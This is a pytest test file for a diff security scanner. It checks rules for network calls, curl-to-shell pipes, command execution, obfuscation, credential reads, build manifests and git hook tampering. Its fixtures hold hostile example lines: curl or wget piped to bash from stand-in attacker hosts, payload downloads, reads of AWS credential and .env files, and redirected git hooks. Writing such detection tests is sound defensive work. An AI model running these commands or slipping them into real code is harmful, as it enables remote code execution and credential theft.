"""
tests/test_safety.py — Unit tests for Phase 4a diff security scanner rules.

>= 3 positive and >= 3 negative test cases per rule, plus vendoring,
scratch script, and context/test-file severity lowering tests.
"""

import os
import sys
import pytest

sys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), "..")))

from diffsmith.safety import (
    check_vendored_paths,
    check_scratch_scripts,
    check_network_calls,
    check_shell_pipe,
    check_command_exec,
    check_obfuscation,
    check_credential_reads,
    check_workflow_build,
    check_hook_tampering,
    scan_patch,
)


# ──────────────────────────────────────────────────────────────────────────────
# Rule: vendored_directory_added (3+ pos, 3+ neg)
# Note: .git is NOT in vendored paths (handled by git-hook rules or ignored)
# ──────────────────────────────────────────────────────────────────────────────
@pytest.mark.parametrize("patch", [
    "--- a/venv/lib/python3.9/site-packages/pkg/app.py\n+++ b/venv/lib/python3.9/site-packages/pkg/app.py\n@@ -1,1 +1,2 @@\n+x = 1\n",
    "--- a/.venv/bin/activate\n+++ b/.venv/bin/activate\n@@ -1,1 +1,2 @@\n+# edit\n",
    "--- a/node_modules/express/index.js\n+++ b/node_modules/express/index.js\n@@ -1,1 +1,2 @@\n+const x = 1;\n",
    "--- a/venv/pyvenv.cfg\n+++ b/venv/pyvenv.cfg\n@@ -1,1 +1,2 @@\n+version = 3.9\n",
])
def test_vendored_paths_positive(patch):
    findings = check_vendored_paths(patch)
    assert len(findings) >= 1
    assert all(f["rule_id"] == "vendored_directory_added" for f in findings)
    assert all(f["severity"] == "review" for f in findings)


@pytest.mark.parametrize("patch", [
    "--- a/src/app.py\n+++ b/src/app.py\n@@ -1,1 +1,2 @@\n+x = 1\n",
    "--- a/lib/venue/event.py\n+++ b/lib/venue/event.py\n@@ -1,1 +1,2 @@\n+x = 1\n",
    "--- a/tests/test_vendor.py\n+++ b/tests/test_vendor.py\n@@ -1,1 +1,2 @@\n+assert True\n",
    "--- a/.git/config\n+++ b/.git/config\n@@ -1,1 +1,2 @@\n+[core]\n",
])
def test_vendored_paths_negative(patch):
    findings = check_vendored_paths(patch)
    assert len(findings) == 0


# ──────────────────────────────────────────────────────────────────────────────
# Rule: scratch_script_added (3+ pos, 3+ neg)
# ──────────────────────────────────────────────────────────────────────────────
@pytest.mark.parametrize("patch", [
    "--- /dev/null\n+++ b/reproduce_issue.py\n@@ -0,0 +1,2 @@\n+import os\n",
    "--- a/repro_123.py\n+++ b/repro_123.py\n@@ -1,1 +1,2 @@\n+print('bug')\n",
    "--- a/debug_patch.py\n+++ b/debug_patch.py\n@@ -1,1 +1,2 @@\n+test()\n",
    "--- a/tmp_test.py\n+++ b/tmp_test.py\n@@ -1,1 +1,2 @@\n+x = 2\n",
])
def test_scratch_scripts_positive(patch):
    findings = check_scratch_scripts(patch)
    assert len(findings) >= 1
    assert all(f["rule_id"] == "scratch_script_added" for f in findings)
    assert all(f["severity"] == "low" for f in findings)


@pytest.mark.parametrize("patch", [
    "--- a/src/reproduce/core.py\n+++ b/src/reproduce/core.py\n@@ -1,1 +1,2 @@\n+x = 1\n",
    "--- a/lib/debug.py\n+++ b/lib/debug.py\n@@ -1,1 +1,2 @@\n+x = 1\n",
    "--- a/main.py\n+++ b/main.py\n@@ -1,1 +1,2 @@\n+x = 1\n",
])
def test_scratch_scripts_negative(patch):
    findings = check_scratch_scripts(patch)
    assert len(findings) == 0


# ──────────────────────────────────────────────────────────────────────────────
# Rule 1: network_calls (3+ pos, 3+ neg)
# ──────────────────────────────────────────────────────────────────────────────
@pytest.mark.parametrize("patch", [
    "--- a/lib/app.py\n+++ b/lib/app.py\n@@ -10,1 +10,2 @@\n context\n+import requests\n+resp = requests.get('https://evil.com/api')\n",
    "--- a/lib/net.py\n+++ b/lib/net.py\n@@ -1,1 +1,2 @@\n-old\n+import urllib.request\n+data = urllib.request.urlopen('http://leak.org')\n",
    "--- a/lib/sock.py\n+++ b/lib/sock.py\n@@ -5,1 +5,2 @@\n+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n",
    "--- a/deploy.sh\n+++ b/deploy.sh\n@@ -1,1 +1,2 @@\n+curl -s https://evil.org/payload.bin -o /tmp/payload\n",
])
def test_network_calls_positive(patch):
    findings = check_network_calls(patch)
    assert len(findings) >= 1
    assert all(f["rule_id"] == "SEC001_NETWORK_CALL" for f in findings)
    assert all(f["severity"] == "MEDIUM" for f in findings)


@pytest.mark.parametrize("patch", [
    "--- a/lib/app.py\n+++ b/lib/app.py\n@@ -10,2 +10,1 @@\n-import requests\n-resp = requests.get('https://evil.com')\n+pass\n",
    "--- a/lib/math_utils.py\n+++ b/lib/math_utils.py\n@@ -1,1 +1,2 @@\n def add(a, b):\n+    return a + b\n",
    "--- a/lib/doc.py\n+++ b/lib/doc.py\n@@ -1,1 +1,2 @@\n+# Note: do not issue network requests here\n",
])
def test_network_calls_negative(patch):
    findings = check_network_calls(patch)
    assert len(findings) == 0


# ──────────────────────────────────────────────────────────────────────────────
# Rule 2: shell_pipe (3+ pos, 3+ neg)
# ──────────────────────────────────────────────────────────────────────────────
@pytest.mark.parametrize("patch", [
    "--- a/install.sh\n+++ b/install.sh\n@@ -1,1 +1,2 @@\n+curl -sSL https://malicious.site/install.sh | bash\n",
    "--- a/setup.sh\n+++ b/setup.sh\n@@ -1,1 +1,2 @@\n+wget -qO- http://bad.com/setup | sh\n",
    "--- a/agent.py\n+++ b/agent.py\n@@ -1,1 +1,2 @@\n+os.system('curl http://attacker.com/run.py | python3')\n",
    "--- a/quick.sh\n+++ b/quick.sh\n@@ -1,1 +1,2 @@\n+curl|sh\n",
])
def test_shell_pipe_positive(patch):
    findings = check_shell_pipe(patch)
    assert len(findings) >= 1
    assert all(f["rule_id"] == "SEC002_SHELL_PIPE" for f in findings)
    assert all(f["severity"] == "CRITICAL" for f in findings)


@pytest.mark.parametrize("patch", [
    "--- a/install.sh\n+++ b/install.sh\n@@ -1,1 +1,2 @@\n+curl -O https://example.com/archive.tar.gz\n",
    "--- a/process.sh\n+++ b/process.sh\n@@ -1,1 +1,2 @@\n+cat log.txt | grep error | sort\n",
    "--- a/doc.md\n+++ b/doc.md\n@@ -1,1 +1,2 @@\n+# Never run: curl | sh without verification\n",
])
def test_shell_pipe_negative(patch):
    findings = check_shell_pipe(patch)
    assert len(findings) == 0


# ──────────────────────────────────────────────────────────────────────────────
# Rule 3: command_exec (3+ pos, 3+ neg)
# ──────────────────────────────────────────────────────────────────────────────
@pytest.mark.parametrize("patch", [
    "--- a/lib/runner.py\n+++ b/lib/runner.py\n@@ -1,1 +1,2 @@\n+import subprocess\n+subprocess.run(['ls', '-la'])\n",
    "--- a/lib/sys_task.py\n+++ b/lib/sys_task.py\n@@ -1,1 +1,2 @@\n+os.system('echo compromised')\n",
    "--- a/lib/evaluator.py\n+++ b/lib/evaluator.py\n@@ -1,1 +1,2 @@\n+res = eval(user_untrusted_input)\n",
    "--- a/lib/executor.py\n+++ b/lib/executor.py\n@@ -1,1 +1,2 @@\n+exec(dynamically_generated_code)\n",
])
def test_command_exec_positive(patch):
    findings = check_command_exec(patch)
    assert len(findings) >= 1
    assert all(f["rule_id"] == "SEC003_COMMAND_EXEC" for f in findings)
    assert all(f["severity"] == "MEDIUM" for f in findings)


@pytest.mark.parametrize("patch", [
    "--- a/lib/runner.py\n+++ b/lib/runner.py\n@@ -1,2 +1,1 @@\n-os.system('old command')\n+pass\n",
    "--- a/lib/calc.py\n+++ b/lib/calc.py\n@@ -1,1 +1,2 @@\n+def evaluate_accuracy(preds, labels):\n+    return sum(preds == labels) / len(labels)\n",
    "--- a/lib/task.py\n+++ b/lib/task.py\n@@ -1,1 +1,2 @@\n+execute_transaction(account, amount)\n",
])
def test_command_exec_negative(patch):
    findings = check_command_exec(patch)
    assert len(findings) == 0


# ──────────────────────────────────────────────────────────────────────────────
# Rule 4: obfuscation (3+ pos, 3+ neg)
# ──────────────────────────────────────────────────────────────────────────────
@pytest.mark.parametrize("patch", [
    "--- a/lib/loader.py\n+++ b/lib/loader.py\n@@ -1,1 +1,2 @@\n+import base64\n+code = base64.b64decode('aW1wb3J0IG9z')\n",
    "--- a/lib/unpack.py\n+++ b/lib/unpack.py\n@@ -1,1 +1,2 @@\n+from base64 import b64decode\n+payload = b64decode(encoded_string)\n",
    "--- a/lib/codec.py\n+++ b/lib/codec.py\n@@ -1,1 +1,2 @@\n+decoded = codecs.decode('nop', 'rot13')\n",
    "--- a/lib/hex_helper.py\n+++ b/lib/hex_helper.py\n@@ -1,1 +1,2 @@\n+binascii.unhexlify('414243')\n",
])
def test_obfuscation_positive(patch):
    findings = check_obfuscation(patch)
    assert len(findings) >= 1
    assert all(f["rule_id"] == "SEC004_OBFUSCATION" for f in findings)
    assert all(f["severity"] == "MEDIUM" for f in findings)


@pytest.mark.parametrize("patch", [
    "--- a/lib/encode.py\n+++ b/lib/encode.py\n@@ -1,1 +1,2 @@\n+import base64\n+encoded = base64.b64encode(b'safe string')\n",
    "--- a/lib/str_util.py\n+++ b/lib/str_util.py\n@@ -1,1 +1,2 @@\n+text = raw_bytes.decode('utf-8')\n",
    "--- a/lib/data.py\n+++ b/lib/data.py\n@@ -1,1 +1,2 @@\n+data = b'binary data payload'\n",
])
def test_obfuscation_negative(patch):
    findings = check_obfuscation(patch)
    assert len(findings) == 0


# ──────────────────────────────────────────────────────────────────────────────
# Rule 5: credential_reads (3+ pos, 3+ neg)
# ──────────────────────────────────────────────────────────────────────────────
@pytest.mark.parametrize("patch", [
    "--- a/lib/auth.py\n+++ b/lib/auth.py\n@@ -1,1 +1,2 @@\n+api_key = os.environ.get('API_KEY')\n",
    "--- a/lib/token.py\n+++ b/lib/token.py\n@@ -1,1 +1,2 @@\n+token = os.getenv('GITHUB_TOKEN')\n",
    "--- a/lib/config.py\n+++ b/lib/config.py\n@@ -1,1 +1,2 @@\n+with open('.env') as f:\n+    secrets = f.read()\n",
    "--- a/lib/aws.py\n+++ b/lib/aws.py\n@@ -1,1 +1,2 @@\n+with open('/home/user/.aws/credentials') as f: creds = f.read()\n",
])
def test_credential_reads_positive(patch):
    findings = check_credential_reads(patch)
    assert len(findings) >= 1
    assert all(f["rule_id"] == "SEC005_CREDENTIAL_READS" for f in findings)
    assert all(f["severity"] == "HIGH" for f in findings)


@pytest.mark.parametrize("patch", [
    "--- a/lib/auth.py\n+++ b/lib/auth.py\n@@ -1,2 +1,1 @@\n-token = os.getenv('API_KEY')\n+token = 'local_mock'\n",
    "--- a/lib/dict_lookup.py\n+++ b/lib/dict_lookup.py\n@@ -1,1 +1,2 @@\n+val = settings.get('timeout', 10)\n",
    "--- a/lib/file_io.py\n+++ b/lib/file_io.py\n@@ -1,1 +1,2 @@\n+with open('data.json') as f:\n+    config = json.load(f)\n",
])
def test_credential_reads_negative(patch):
    findings = check_credential_reads(patch)
    assert len(findings) == 0


# ──────────────────────────────────────────────────────────────────────────────
# Rule 6: workflow_build (3+ pos, 3+ neg)
# ──────────────────────────────────────────────────────────────────────────────
@pytest.mark.parametrize("patch", [
    "--- a/.github/workflows/ci.yml\n+++ b/.github/workflows/ci.yml\n@@ -1,1 +1,2 @@\n+name: CI\n",
    "--- a/setup.py\n+++ b/setup.py\n@@ -1,1 +1,2 @@\n+install_requires = ['evil-pkg']\n",
    "--- a/pyproject.toml\n+++ b/pyproject.toml\n@@ -5,1 +5,2 @@\n+dependencies = ['malicious-dep']\n",
    "--- a/requirements.txt\n+++ b/requirements.txt\n@@ -1,1 +1,2 @@\n+requests>=2.31.0\n",
])
def test_workflow_build_positive(patch):
    findings = check_workflow_build(patch)
    assert len(findings) >= 1
    assert all(f["rule_id"] == "SEC006_WORKFLOW_BUILD" for f in findings)
    assert all(f["severity"] == "MEDIUM" for f in findings)


@pytest.mark.parametrize("patch", [
    "--- a/src/diffsmith/core.py\n+++ b/src/diffsmith/core.py\n@@ -1,1 +1,2 @@\n+def fix_bug(): pass\n",
    "--- a/lib/matplotlib/axis.py\n+++ b/lib/matplotlib/axis.py\n@@ -1,1 +1,2 @@\n+x = 1\n",
    "--- a/tests/test_model.py\n+++ b/tests/test_model.py\n@@ -1,1 +1,2 @@\n+assert True\n",
])
def test_workflow_build_negative(patch):
    findings = check_workflow_build(patch)
    assert len(findings) == 0


# ──────────────────────────────────────────────────────────────────────────────
# Rule 7: hook_tampering (>=3 pos: .git/hooks/pre-commit, .git/hooks/post-checkout,
#                         .git/config with hook command;
#                         >=3 neg: .github/workflows/ci.yml handled by SEC006,
#                         .gitignore, docs/git.md)
# ──────────────────────────────────────────────────────────────────────────────
@pytest.mark.parametrize("patch", [
    "--- a/.git/hooks/pre-commit\n+++ b/.git/hooks/pre-commit\n@@ -1,1 +1,2 @@\n+#!/bin/sh\n+exec evil_script\n",
    "--- a/.git/hooks/post-checkout\n+++ b/.git/hooks/post-checkout\n@@ -1,1 +1,2 @@\n+#!/bin/sh\n+echo evil\n",
    "--- a/.git/config\n+++ b/.git/config\n@@ -1,2 +1,3 @@\n [core]\n+    hooksPath = /tmp/evil_hooks\n",
    "--- a/.git/config\n+++ b/.git/config\n@@ -1,2 +1,3 @@\n [core]\n+    hook = /tmp/evil_hook.sh\n",
    "--- a/.pre-commit-config.yaml\n+++ b/.pre-commit-config.yaml\n@@ -1,1 +1,2 @@\n+- repo: https://evil.com/hook\n",
    "--- a/setup.py\n+++ b/setup.py\n@@ -10,1 +10,2 @@\n+class PostInstallCommand(install):\n+    pass\n",
    "--- a/package.json\n+++ b/package.json\n@@ -2,1 +2,2 @@\n+  \"postinstall\": \"bash setup.sh\"\n",
])
def test_hook_tampering_positive(patch):
    findings = check_hook_tampering(patch)
    assert len(findings) >= 1
    assert all(f["rule_id"] == "SEC007_HOOK_TAMPERING" for f in findings)
    assert all(f["severity"] == "HIGH" for f in findings)


@pytest.mark.parametrize("patch", [
    "--- a/.github/workflows/ci.yml\n+++ b/.github/workflows/ci.yml\n@@ -1,1 +1,2 @@\n+name: CI\n",
    "--- a/.gitignore\n+++ b/.gitignore\n@@ -1,1 +1,2 @@\n+*.pyc\n",
    "--- a/docs/git.md\n+++ b/docs/git.md\n@@ -1,1 +1,2 @@\n+# Git Documentation\n",
    "--- a/src/core.py\n+++ b/src/core.py\n@@ -1,1 +1,2 @@\n+class NormalClass:\n+    pass\n",
    "--- a/setup.py\n+++ b/setup.py\n@@ -1,1 +1,2 @@\n+name = 'diffsmith'\n",
])
def test_hook_tampering_negative(patch):
    findings = check_hook_tampering(patch)
    assert len(findings) == 0


def test_github_workflow_handled_by_sec006_not_sec007():
    """Verify .github/workflows/ci.yml is handled by SEC006 (workflow_build) and NOT SEC007."""
    patch = "--- a/.github/workflows/ci.yml\n+++ b/.github/workflows/ci.yml\n@@ -1,1 +1,2 @@\n+name: Test CI\n"
    hook_findings = check_hook_tampering(patch)
    workflow_findings = check_workflow_build(patch)
    assert len(hook_findings) == 0
    assert len(workflow_findings) == 1
    assert workflow_findings[0]["rule_id"] == "SEC006_WORKFLOW_BUILD"


# ──────────────────────────────────────────────────────────────────────────────
# Tests for Severity Lowering and Vendoring Exclusion
# ──────────────────────────────────────────────────────────────────────────────
def test_vendored_paths_excluded_from_safety_rules():
    """Vendored files must NOT trigger SEC rules; only vendored_directory_added."""
    patch = (
        "--- a/venv/lib/python3.9/site-packages/pkg/app.py\n"
        "+++ b/venv/lib/python3.9/site-packages/pkg/app.py\n"
        "@@ -1,1 +1,5 @@\n"
        "+import requests\n"
        "+requests.get('https://evil.com')\n"
        "+subprocess.run(['ls'])\n"
    )
    findings = scan_patch(patch)
    rule_ids = {f["rule_id"] for f in findings}
    assert "vendored_directory_added" in rule_ids
    assert "SEC001_NETWORK_CALL" not in rule_ids
    assert "SEC003_COMMAND_EXEC" not in rule_ids


def test_severity_lowered_for_test_files():
    """In test files, SEC001, SEC003, SEC004, SEC005 must have severity: low."""
    patch = (
        "--- a/tests/test_api.py\n"
        "+++ b/tests/test_api.py\n"
        "@@ -1,1 +1,4 @@\n"
        "+import requests\n"
        "+requests.post('http://test')\n"
        "+subprocess.run(['pytest'])\n"
    )
    findings = scan_patch(patch)
    for f in findings:
        if f["rule_id"] in ("SEC001_NETWORK_CALL", "SEC003_COMMAND_EXEC"):
            assert f["severity"] == "low"


def test_severity_lowered_when_call_exists_in_context():
    """Modifying existing calls in context/removed lines lowers severity to low."""
    patch = (
        "--- a/src/app.py\n"
        "+++ b/src/app.py\n"
        "@@ -10,3 +10,3 @@\n"
        " prev_line\n"
        "-subprocess.run(['old', 'arg'])\n"
        "+subprocess.run(['new', 'arg'])\n"
        " next_line\n"
    )
    findings = check_command_exec(patch)
    assert len(findings) == 1
    assert findings[0]["severity"] == "low"


def test_sec002_and_sec007_remain_high_even_in_test_files():
    """SEC002 (shell_pipe) and SEC007 (hook_tampering) must stay CRITICAL/HIGH."""
    patch_pipe = (
        "--- a/tests/test_deploy.py\n"
        "+++ b/tests/test_deploy.py\n"
        "@@ -1,1 +1,3 @@\n"
        "+os.system('curl bad.org | bash')\n"
    )
    findings_pipe = check_shell_pipe(patch_pipe)
    assert len(findings_pipe) == 1
    assert findings_pipe[0]["severity"] == "CRITICAL"

    patch_hook = (
        "--- a/tests/.git/hooks/pre-commit\n"
        "+++ b/tests/.git/hooks/pre-commit\n"
        "@@ -1,1 +1,2 @@\n"
        "+#!/bin/sh\n"
    )
    findings_hook = check_hook_tampering(patch_hook)
    assert len(findings_hook) == 1
    assert findings_hook[0]["severity"] == "HIGH"


# ──────────────────────────────────────────────────────────────────────────────
# Phase 4a-calibrate tests:
# 1. SEC006 manifest-only filter (>=3 pos in manifests, >=3 neg in non-manifests)
# 2. SEC005 env write exclusion & credential HIGH vs generic low
# 3. Scratch script severity capping for SEC001/SEC003/SEC005
# ──────────────────────────────────────────────────────────────────────────────
@pytest.mark.parametrize("patch", [
    "--- a/setup.py\n+++ b/setup.py\n@@ -1,1 +1,2 @@\n+dependencies = ['pkg1']\n",
    "--- a/pyproject.toml\n+++ b/pyproject.toml\n@@ -1,1 +1,2 @@\n+dependencies = ['pkg2']\n",
    "--- a/sub/setup.cfg\n+++ b/sub/setup.cfg\n@@ -1,1 +1,2 @@\n+dependencies = pkg3\n",
    "--- a/Pipfile\n+++ b/Pipfile\n@@ -1,1 +1,2 @@\n+[packages]\n",
])
def test_sec006_calibrate_manifest_positive(patch):
    """SEC006 fires on dependencies inside package manifest/config files."""
    findings = check_workflow_build(patch)
    assert len(findings) >= 1
    assert any(f["rule_id"] == "SEC006_WORKFLOW_BUILD" for f in findings)


@pytest.mark.parametrize("patch", [
    "--- a/django/db/migrations/0001_initial.py\n+++ b/django/db/migrations/0001_initial.py\n@@ -1,1 +1,2 @@\n+dependencies = [('core', '0001_initial')]\n",
    "--- a/models.py\n+++ b/models.py\n@@ -1,1 +1,2 @@\n+dependencies = ['some_model']\n",
    "--- a/app/tasks.py\n+++ b/app/tasks.py\n@@ -1,1 +1,2 @@\n+dependencies = get_task_dependencies()\n",
])
def test_sec006_calibrate_non_manifest_dependencies_negative(patch):
    """SEC006 does NOT fire on python variables called dependencies in non-manifest files."""
    findings = check_workflow_build(patch)
    assert len(findings) == 0


@pytest.mark.parametrize("patch", [
    "--- a/src/app.py\n+++ b/src/app.py\n@@ -1,1 +1,2 @@\n+os.environ['ENV'] = 'production'\n",
    "--- a/src/config.py\n+++ b/src/config.py\n@@ -1,1 +1,2 @@\n+os.environ.setdefault('PORT', '8080')\n",
    "--- a/src/server.py\n+++ b/src/server.py\n@@ -1,1 +1,2 @@\n+os.environ.update({'HOST': 'localhost'})\n",
])
def test_sec005_env_write_ignored_negative(patch):
    """SEC005 excludes environment variable writes (os.environ[...] = ...)."""
    findings = check_credential_reads(patch)
    assert len(findings) == 0


@pytest.mark.parametrize("patch", [
    "--- a/src/app.py\n+++ b/src/app.py\n@@ -1,1 +1,2 @@\n+port = os.getenv('PORT')\n",
    "--- a/src/config.py\n+++ b/src/config.py\n@@ -1,1 +1,2 @@\n+debug = os.environ.get('DEBUG', 'false')\n",
    "--- a/src/worker.py\n+++ b/src/worker.py\n@@ -1,1 +1,2 @@\n+threads = os.environ['NUM_THREADS']\n",
])
def test_sec005_generic_env_read_low_severity(patch):
    """SEC005 generic env reads without credential-like names are low severity."""
    findings = check_credential_reads(patch)
    assert len(findings) == 1
    assert findings[0]["severity"] == "low"


@pytest.mark.parametrize("patch", [
    "--- a/src/auth.py\n+++ b/src/auth.py\n@@ -1,1 +1,2 @@\n+token = os.environ.get('GITHUB_TOKEN')\n",
    "--- a/src/client.py\n+++ b/src/client.py\n@@ -1,1 +1,2 @@\n+key = os.environ['AWS_SECRET_ACCESS_KEY']\n",
    "--- a/src/db.py\n+++ b/src/db.py\n@@ -1,1 +1,2 @@\n+pwd = os.getenv('DB_PASSWORD')\n",
    "--- a/src/crypto.py\n+++ b/src/crypto.py\n@@ -1,1 +1,2 @@\n+with open('.env') as f: data = f.read()\n",
])
def test_sec005_credential_target_high_severity(patch):
    """SEC005 credential-like names and .env files outside scratch/test files are HIGH severity."""
    findings = check_credential_reads(patch)
    assert len(findings) == 1
    assert findings[0]["severity"] == "HIGH"


@pytest.mark.parametrize("patch", [
    "--- a/reproduce_issue.py\n+++ b/reproduce_issue.py\n@@ -1,1 +1,4 @@\n+token = os.environ.get('GITHUB_TOKEN')\n+import requests\n+requests.get('http://test')\n+import subprocess\n+subprocess.run(['ls'])\n",
    "--- a/repro_bug.py\n+++ b/repro_bug.py\n@@ -1,1 +1,4 @@\n+pwd = os.environ.get('DB_PASSWORD')\n+import requests\n+requests.post('http://test')\n+import subprocess\n+subprocess.call(['ls'])\n",
    "--- a/tmp_check.py\n+++ b/tmp_check.py\n@@ -1,1 +1,4 @@\n+secret = os.getenv('SECRET_KEY')\n+import requests\n+requests.get('http://test')\n+import subprocess\n+subprocess.Popen(['ls'])\n",
])
def test_scratch_scripts_severity_capped_at_low(patch):
    """Calls inside scratch scripts (reproduce*, repro*, debug*, tmp*) are low severity for SEC001/003/005."""
    findings = scan_patch(patch)
    # Check that any SEC001, SEC003, SEC005 findings have low severity (never HIGH)
    for f in findings:
        if f["rule_id"] in ("SEC001_NETWORK_CALL", "SEC003_COMMAND_EXEC", "SEC005_CREDENTIAL_READS"):
            assert f["severity"] == "low"

